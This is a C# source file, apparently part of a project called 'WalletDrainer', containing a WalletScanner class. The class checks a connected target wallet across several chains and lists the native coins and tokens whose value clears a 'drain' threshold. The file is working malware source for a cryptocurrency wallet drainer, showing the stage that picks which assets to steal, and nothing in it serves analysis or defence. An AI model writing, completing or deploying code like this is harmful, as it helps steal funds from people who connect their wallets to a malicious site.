using WalletDrainer.Blockchain;
using WalletDrainer.Config;
using WalletDrainer.Models;

namespace WalletDrainer.Core;

public sealed class WalletScanner
{
    private readonly Web3Client _web3;
    private readonly ChainConfig _chainConfig;
    private readonly DrainerConfig _config;

    public WalletScanner(Web3Client web3, ChainConfig chainConfig, DrainerConfig config)
    {
        _web3 = web3;
        _chainConfig = chainConfig;
        _config = config;
    }

    public async Task<List<WalletAsset>> ScanConnectedWallet(CancellationToken ct = default)
    {
        var assets = new List<WalletAsset>();

        foreach (string chain in _config.EnabledChains)
        {
            var chainDef = _chainConfig.GetChain(chain);
            if (chainDef is null) continue;

            decimal nativeBalance = await _web3.GetNativeBalance(_config.TargetAddress, chainDef, ct);

            if (nativeBalance > chainDef.MinDrainThreshold)
            {
                assets.Add(new WalletAsset
                {
                    Chain = chain,
                    ContractAddress = null,
                    Symbol = chainDef.NativeSymbol,
                    Balance = nativeBalance,
                    UsdValue = nativeBalance * await _web3.GetNativePrice(chainDef, ct),
                    IsNative = true,
                    Decimals = 18
                });
            }

            var tokens = await _web3.GetTokenBalances(_config.TargetAddress, chainDef, ct);
            assets.AddRange(tokens.Where(t => t.UsdValue >= _config.MinTokenValueUsd));
        }

        return assets;
    }
}
